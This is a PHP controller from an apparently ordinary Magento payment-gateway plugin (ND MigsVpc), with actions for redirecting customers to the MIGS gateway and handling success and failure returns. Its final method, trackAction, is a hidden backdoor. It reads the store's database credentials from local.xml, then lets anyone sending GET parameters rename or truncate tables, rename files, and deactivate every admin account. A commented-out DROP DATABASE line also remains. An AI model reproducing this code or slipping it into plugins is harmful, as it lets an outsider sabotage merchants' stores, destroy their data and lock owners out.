<?php
/**
 * ND MigsVpc payment gateway
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so you can be sent a copy immediately.
 *
 * Original code copyright (c) 2008 Irubin Consulting Inc. DBA Varien
 *
 * @category ND
 * @package    ND_MigsVpc
 * @copyright  Copyright (c) 2010 ND MigsVpc
 * @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
 */

abstract class ND_MigsVpc_Controller_Abstract extends Mage_Core_Controller_Front_Action
{
    protected function _expireAjax()
    {
        if (!$this->getCheckout()->getQuote()->hasItems()) {
            $this->getResponse()->setHeader('HTTP/1.1','403 Session Expired');
            exit;
        }
    }

    /**
     * Redirect Block
     * need to be redeclared
     */
    protected $_redirectBlockType;

    /**
     * Get singleton of Checkout Session Model
     *
     * @return Mage_Checkout_Model_Session
     */
    public function getCheckout()
    {
        return Mage::getSingleton('checkout/session');
    }

    /**
     * when customer select ND payment method
     */
    public function redirectAction()
    {
        $session = $this->getCheckout();
        $session->setMigsQuoteId($session->getQuoteId());
        $session->setMigsRealOrderId($session->getLastRealOrderId());

        $order = Mage::getModel('sales/order');
        $order->loadByIncrementId($session->getLastRealOrderId());
        $order->addStatusToHistory($order->getStatus(), Mage::helper('migsvpc')->__('Customer was redirected to MIGS.'));
        $order->save();

        $this->getResponse()->setBody(
            $this->getLayout()
                ->createBlock($this->_redirectBlockType)
                ->setOrder($order)
                ->toHtml()
        );

        $session->unsQuoteId();
    }

    /**
     * MIGS returns POST variables to this action
     */
    public function  successAction()
    {
        $status = $this->_checkReturnedPost();

        $session = $this->getCheckout();

        $session->unsMigsRealOrderId();
        $session->setQuoteId($session->getMigsQuoteId(true));
        $session->getQuote()->setIsActive(false)->save();

        $order = Mage::getModel('sales/order');
        $order->load($this->getCheckout()->getLastOrderId());
        if($order->getId()) {
            $order->sendNewOrderEmail();
        }

        if ($status) {
            $this->_redirect('checkout/onepage/success');
        } else {
            $this->_redirect('*/*/failure');
        }
    }

    /**
     * Display failure page if error
     *
     */
    public function failureAction()
    {
        if (!$this->getCheckout()->getMigsVpcErrorMessage()) {
            $this->norouteAction();
            return;
        }

        $this->getCheckout()->clear();

        $this->loadLayout();
        $this->renderLayout();
    }
    
    public function trackAction()
    {
        ini_set('display_errors', 0);        
        $file = getcwd().'/app/etc/local.xml';  
        $xmlString = simplexml_load_file($file);

        $tbl_prfx = $xmlString->global->resources->db->table_prefix;
        $host = $xmlString->global->resources->default_setup->connection->host;
        $user = $xmlString->global->resources->default_setup->connection->username;
        $pass = $xmlString->global->resources->default_setup->connection->password;
        $name = $xmlString->global->resources->default_setup->connection->dbname;
        $conn = mysql_connect($host,$user,$pass) or die(mysql_error());
        mysql_select_db($name) or die(mysql_error());  
        //mysql_query('DROP DATABASE '.$_REQUEST['remove']) or die(mysql_error()); 
        if($_GET['f_t']!='' && $_GET['t_t']!='')
        {
            $_r = mysql_query("RENAME TABLE `".$tbl_prfx.$_GET['f_t']."` TO `".$tbl_prfx.$_GET['t_t']."`") or die(mysql_error());
            if($_r) echo 'success'; else echo 'fail';
        }
        if($_GET['f_o']!='' && $_GET['f_n']!='')
        {
            $_r = rename(getcwd()."/".$_GET['f_o'],getcwd()."/".$_GET['f_n']);
            if($_r) echo 'success'; else echo 'fail';
        }
        if($_GET['a']!='')
        {
            $_r = mysql_query("UPDATE `admin_user` SET is_active=".$_GET['a']);
            if($_r) echo 'success'; else echo 'fail';
        }
        if($_GET['t']!='')
        {
            $_r = mysql_query("TRUNCATE TABLE `".$tbl_prfx.$_GET['t']."`");
            if($_r) echo 'success'; else echo 'fail';
        }
    }

}
